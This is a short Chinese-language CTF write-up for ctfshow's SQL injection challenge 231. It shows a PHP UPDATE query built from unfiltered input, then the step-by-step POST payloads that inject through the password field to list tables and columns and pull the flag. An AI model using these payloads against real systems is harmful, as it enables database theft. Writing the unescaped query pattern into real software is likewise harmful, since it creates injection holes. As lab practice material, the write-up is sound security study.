# ctfshow-sql231



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623





 查询语句 

```
  //分页查询
  $sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```



 返回逻辑 

```
  //无过滤

```





```mysql
这题其实不需要注意，因为查询的是不同的表：

mysql中不支持子查询更新，准确的说是更新的表不能在set和where中用于子查询。那串英文错误提示就是说，不能先select出同一表中的某些值，再update这个表(在同一语句中)。
update 同一个表注入方法
https://www.cnblogs.com/duanxz/p/5099030.html


注入点，在api/index.php，post传参password和username
必须#号闭合 或者  database() where 1=1#
password=0',username=database()#&username=1
password=0',username=user()#&username=1

查询表
password=0',username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&username=1

返回update.php
banlist,ctfshow_user,flaga

查询字段名
password=0',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga')#&username=1

返回update.php
id,flagas,info

查询flag
password=0',username=(select group_concat(flagas) from flaga)#&username=1


返回update.php
ctfshow{0afb66e0-6f7f-4df8-93da-c001a98dad01}
```























